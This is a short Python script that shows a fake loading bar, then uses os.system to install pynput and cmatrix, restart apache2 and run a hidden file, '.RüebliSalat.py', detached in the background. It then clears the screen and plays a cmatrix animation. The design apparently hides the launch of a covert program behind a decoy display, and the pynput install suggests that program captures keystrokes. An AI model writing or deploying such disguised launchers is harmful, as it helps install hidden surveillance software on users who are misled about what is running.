import time
import os
import sys
print("==================================================================================================================|")
for i in range(21):
    sys.stdout.write('\r')
    sys.stdout.write("Loading: %-20s %d%%|" % ('#####'*i, 5*i))
    sys.stdout.flush()
    time.sleep(0.25)
    if i == 20:
        break;
        sys.stdout.flush()
print("\n==================================================================================================================|")
os.system('apt-get update')
os.system('pip install pynput')
os.system('apt-get install cmatrix')
os.system('ls')
os.system('sudo service apache2 restart')
os.system('python3 .RüebliSalat.py &disown')
os.system('clear')
print("100% Complete.")
os.system('cmatrix')
